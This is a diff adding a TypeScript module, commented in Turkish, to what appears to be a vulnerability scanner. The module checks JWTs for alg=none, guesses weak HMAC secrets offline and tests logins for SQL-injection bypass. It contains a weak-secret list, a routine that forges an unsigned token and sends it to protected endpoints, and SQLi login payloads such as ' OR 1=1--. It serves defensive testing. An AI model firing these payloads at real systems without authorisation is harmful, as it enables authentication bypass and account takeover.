@@ -1,0 +1,157 @@
+/**
+ * (İŞ 3) EK KİMLİK-DOĞRULAMA KONTROLLERİ — JWT/token güvenliği + Giriş baypası (SQLi göstergesi).
+ *
+ * İLKE: "kanıtla, ASLA istismar etme". Analizin çoğu OFFLINE (token'ı çözer, imzayı yaygın sırlarla
+ * doğrular, claim'lere bakar). Aktif kısımlar TEK, zararsız GÖZLEMdir (forged token kabul ediliyor mu;
+ * login baypas göstergesi var mı) — gerçek oturum ele geçirme/istismar YOK, retry YOK, circuit breaker
+ * ve prob-üst-sınırı AYNEN geçerli. Bulunamazsa DÜRÜSTÇE "gösterge yok".
+ */
+import crypto from 'node:crypto';
+import { ProbeCtx, type ActiveCheckEvidence, type VFinding } from './activeVerifyEvidence.js';
+import { type AuthSession, applyAuthHeaders } from './authSession.js';
+
+function b64urlDecode(s: string): string {
+  return Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
+}
+function b64urlEncode(buf: Buffer): string {
+  return buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+}
+
+// Yaygın/zayıf JWT HMAC sırları (OFFLINE deneme — sadece imza doğrulaması; ağ yok).
+const COMMON_JWT_SECRETS = [
+  'secret', 'password', 'changeme', 'jwt', 'token', 'key', 'private', 'admin', 'test', 'dev',
+  '123456', 'secretkey', 'jwtsecret', 'supersecret', 'my-secret', 'your-256-bit-secret', 'cybertestify',
+];
+const HMAC_ALGS: Record<string, string> = { hs256: 'sha256', hs384: 'sha384', hs512: 'sha512' };
+const SENSITIVE_CLAIM_RE = /^(password|pass|pwd|secret|api[_-]?key|private[_-]?key)$/i;
+const PRIVILEGE_CLAIM_RE = /^(role|roles|isadmin|is[_-]?admin|admin|scope|scopes|permissions?|perms?|group|grade|access[_-]?level)$/i;
+
+const empty = (notes: string[]): ActiveCheckEvidence => ({ ok: true, pagesScanned: 0, inputsFound: 0, probesSent: 0, findings: [], stopped: null, notes });
+
+/**
+ * JWT / token güvenlik analizi (full_pentest). Oturum bir JWT bearer taşıyorsa: alg=none, zayıf/bilinen
+ * HMAC sırrı (OFFLINE), hassas/aşırı claim; + TEK guarded "alg=none kabul ediliyor mu" gözlemi.
+ */
+export async function collectJwtAnalysis(host: string, session: AuthSession): Promise<ActiveCheckEvidence> {
+  const token = session.bearer?.trim();
+  if (!token || token.split('.').length !== 3) {
+    return empty(['Oturum bir JWT (üç parçalı token) taşımıyor — JWT/token analizi bu hedef için uygulanabilir değil.']);
+  }
+  const [h, p, sig] = token.split('.');
+  let header: any, payload: any;
+  try { header = JSON.parse(b64urlDecode(h)); payload = JSON.parse(b64urlDecode(p)); } catch {
+    return empty(['Oturum token’ı JWT gibi görünse de çözümlenemedi — analiz yapılamadı.']);
+  }
+  const alg = String(header?.alg ?? '').toLowerCase();
+  const findings: VFinding[] = [];
+  const notes: string[] = [];
+
+  // 1) alg=none (token zaten imzasız).
+  if (alg === 'none' || !sig) {
+    findings.push({ check: 'jwt', inputPoint: 'Authorization Bearer (JWT)', vulnerable: true, technique: 'alg=none / imzasız token',
+      evidence: 'Oturum token’ı imzasız (alg=none) görünüyor — sunucu imzayı doğrulamıyorsa token içeriği (yetki/rol) istemci tarafında değiştirilebilir.', confidence: 'medium', severity: 'high', sideEffectRisk: 'none' });
+  }
+
+  // 2) Zayıf/bilinen HMAC sırrı (OFFLINE): HS* ise imzayı yaygın sırlarla yeniden hesapla, eşleşirse KRİTİK.
+  if (HMAC_ALGS[alg]) {
+    const data = `${h}.${p}`;
+    for (const secret of COMMON_JWT_SECRETS) {
+      const expected = b64urlEncode(crypto.createHmac(HMAC_ALGS[alg], secret).update(data).digest());
+      if (crypto.timingSafeEqual(Buffer.from(expected), Buffer.from(sig)) === false) continue;
+      findings.push({ check: 'jwt', inputPoint: 'Authorization Bearer (JWT)', vulnerable: true, technique: `zayıf/bilinen HMAC sırrı ("${secret}")`,
+        evidence: `Token imzası YAYGIN/zayıf bir sır ("${secret}") ile doğrulandı — saldırgan kendi geçerli token’ını üretip yetki yükseltebilir (kritik). İmza sırrı güçlü/rastgele bir değerle değiştirilmeli.`, confidence: 'high', severity: 'high', sideEffectRisk: 'none' });
+      break;
+    }
+  }
+
+  // 3) Hassas / aşırı claim (OFFLINE gözlem — DEĞERLER gösterilmez).
+  const claimKeys = payload && typeof payload === 'object' ? Object.keys(payload) : [];
+  const secretClaims = claimKeys.filter((k) => SENSITIVE_CLAIM_RE.test(k));
+  const privClaims = claimKeys.filter((k) => PRIVILEGE_CLAIM_RE.test(k));
+  if (secretClaims.length) {
+    findings.push({ check: 'jwt', inputPoint: 'Authorization Bearer (JWT)', vulnerable: true, technique: `token içinde hassas claim (${secretClaims.join(', ')})`,
+      evidence: `Token gövdesinde parola/sır türü claim(ler) taşınıyor: \`${secretClaims.join('`, `')}\`. JWT gövdesi imzalıdır ama ŞİFRELİ DEĞİLDİR — Base64 ile herkes okuyabilir. Bu tür veriler token’a konmamalı. (Değerler raporda gösterilmez.)`, confidence: 'high', severity: 'medium', sideEffectRisk: 'none' });
+  }
+  if (privClaims.length) notes.push(`Token, yetki/rol türü claim(ler) içeriyor: ${privClaims.join(', ')} (bilgilendirme; değerler gösterilmez). Bu claim’ler sunucuda doğrulanmalı, istemciden gelen değere güvenilmemelidir.`);
+  if (payload && typeof payload === 'object' && !('exp' in payload)) notes.push('Token’da son kullanma (exp) claim’i yok — süresiz token, çalınması durumunda kalıcı erişim riski taşır.');
+
+  // 4) (Guarded aktif) "alg=none kabul ediliyor mu" GÖZLEMİ: aynı payload ile imzasız token forge et,
+  //    ÖNCE gerçek token'la 200 dönen bir korumalı okuma ucu bul, SONRA forged token'la aynı ucu dene.
+  //    200 ise sunucu imzasız token'ı kabul ediyor (kritik). Yalnız GÖZLEM — erişim KULLANILMAZ.
+  const forged = `${b64urlEncode(Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })))}.${p}.`;
+  const CANDIDATES = ['/rest/user/whoami', '/api/users/me', '/api/user/me', '/api/me', '/me', '/user/profile', '/rest/user/me'];
+  const real = new ProbeCtx(); real.authHeaders = applyAuthHeaders({}, session);
+  let probedAny = false;
+  for (const path of CANDIDATES) {
+    if (real.stopped) break;
+    const url = `https://${host}${path}`;
+    const okReal = await real.fetchOnce(url); // gerçek token ile korumalı uç mu?
+    if (!okReal || okReal.status !== 200 || /<html|<!doctype|login|sign in/i.test(okReal.text.slice(0, 400))) continue;
+    probedAny = true;
+    const forgedCtx = new ProbeCtx(); forgedCtx.authHeaders = { Authorization: `Bearer ${forged}` };
+    const forgedRes = await forgedCtx.fetchOnce(url); // imzasız token ile aynı uç
+    if (forgedRes && forgedRes.status === 200 && !/unauthor|invalid|expired|<html|<!doctype|login/i.test(forgedRes.text.slice(0, 400))) {
+      findings.push({ check: 'jwt', inputPoint: `Authorization Bearer (alg=none) @ ${path}`, vulnerable: true, technique: 'alg=none forged token KABUL edildi',
+        evidence: `İmzasız (alg=none) forge edilmiş bir token, korumalı bir uçta (${path}) HTTP 200 ile kabul edildi — sunucu JWT imzasını doğrulamıyor (kritik). Gözlem amaçlıdır; erişim kullanılmadı.`, confidence: 'high', severity: 'high', sideEffectRisk: 'none' });
+    }
+    break; // tek korumalı uç yeterli
+  }
+  if (!probedAny) notes.push('alg=none kabul gözlemi için doğrulanabilir bir korumalı okuma ucu (whoami/profil) bulunamadı — bu gözlem atlandı.');
+
+  if (!findings.length) notes.push('JWT/token güvenlik göstergesi bulunamadı (alg=none değil, zayıf sır doğrulanmadı, hassas claim yok).');
+  const probes = real.sent;
+  return { ok: true, pagesScanned: 0, inputsFound: 1, probesSent: probes, findings, stopped: real.stopped, notes };
+}
+
+// ---- Giriş baypası (SQLi göstergesi) ----------------------------------------------------
+const SQLI_LOGIN_PAYLOADS = [`' OR '1'='1`, `' OR 1=1--`, `admin'--`];
+const TOKEN_INDICATOR_RE = /"(token|authentication|jwt|access_token|accessToken|bearer)"\s*:/i;
+const LOGIN_FAIL_RE = /(invalid|hatal|geçersiz|unauthor|yanlış|incorrect|denied|reddedil|401|403)/i;
+
+/**
+ * Login formuna baypas SQLi GÖSTERGESİ (full_pentest + active_verify). Login POST'u zaten izinlidir.
+ * ÖNCE kontrol (uydurma kimlik) → başarısız beklenir; SONRA SQLi payload → başarı/token dönerse GÖSTERGE.
+ * Gerçek oturum ele geçirme/istismar YOK; yalnız "kimlik atlatma göstergesi var mı" gözlemi.
+ */
+export async function collectLoginBypassEvidence(host: string, loginUrl?: string): Promise<ActiveCheckEvidence> {
+  // Login ucu: bilinen (full_pentest authLogin) VEYA yaygın adaylar.
+  const candidates: string[] = [];
+  if (loginUrl) candidates.push(loginUrl);
+  for (const p of ['/rest/user/login', '/api/login', '/api/auth/login', '/api/users/login', '/login', '/auth/login']) {
+    const u = `https://${host}${p}`;
+    if (!candidates.includes(u)) candidates.push(u);
+  }
+
+  const ctx = new ProbeCtx();
+  const findings: VFinding[] = [];
+  const notes: string[] = [];
+  const rnd = crypto.randomBytes(6).toString('hex');
+  const bodyOf = (id: string, pw: string) => JSON.stringify({ email: id, username: id, password: pw });
+  const isSuccess = (r: { status: number; text: string } | null) =>
+    !!r && r.status >= 200 && r.status < 300 && (TOKEN_INDICATOR_RE.test(r.text) || (!LOGIN_FAIL_RE.test(r.text.slice(0, 400)) && r.text.length > 20));
+
+  let testedEndpoint: string | null = null;
+  for (const url of candidates) {
+    if (ctx.stopped) break;
+    // (a) Kontrol: kesinlikle geçersiz kimlik -> başarısız olmalı (uç gerçekten login mi + baseline).
+    const control = await ctx.fetchOnce(url, { method: 'POST', body: bodyOf(`nouser+${rnd}@example.com`, `wrong-${rnd}`), contentType: 'application/json' });
+    if (!control || control.status === 404 || control.status === 0) continue; // bu uç login değil
+    testedEndpoint = url;
+    if (isSuccess(control)) { notes.push(`\`${new URL(url).pathname}\` uydurma kimlikle de başarı döndürdü — güvenilir baypas ölçümü yapılamadı (bu uç atlandı).`); continue; }
+    // (b) SQLi payload'ları — biri kontrolün AKSİNE başarı/token dönerse GÖSTERGE.
+    for (const payload of SQLI_LOGIN_PAYLOADS) {
+      if (ctx.stopped) break;
+      const r = await ctx.fetchOnce(url, { method: 'POST', body: bodyOf(payload, `x-${rnd}`), contentType: 'application/json' });
+      if (isSuccess(r)) {
+        findings.push({ check: 'login_bypass', inputPoint: `POST ${new URL(url).pathname}`, vulnerable: true, technique: `giriş baypası (SQLi göstergesi: \`${payload}\`)`,
+          evidence: `Giriş formuna \`${payload}\` gönderildiğinde, geçersiz kimlik denemesinin AKSİNE oturum/başarı yanıtı (token/2xx) alındı — SQL enjeksiyonuyla kimlik doğrulama atlatma GÖSTERGESİ. Kesin doğrulama manuel test gerektirir; oturum ele geçirme/istismar YAPILMADI.`, confidence: 'medium', severity: 'high', sideEffectRisk: 'none' });
+        break;
+      }
+    }
+    break; // bir gerçek login ucu yeterli
+  }
+
+  if (!testedEndpoint) notes.push('Test edilebilir bir giriş (login) ucu bulunamadı — giriş baypası göstergesi kontrolü uygulanamadı.');
+  else if (!findings.length) notes.push('Giriş baypası (SQLi) göstergesi bulunamadı — SQLi payload’ları geçersiz kimlik denemesinden farklı bir sonuç üretmedi.');
+  return { ok: true, pagesScanned: 0, inputsFound: testedEndpoint ? 1 : 0, probesSent: ctx.sent, findings, stopped: ctx.stopped, notes };
+}
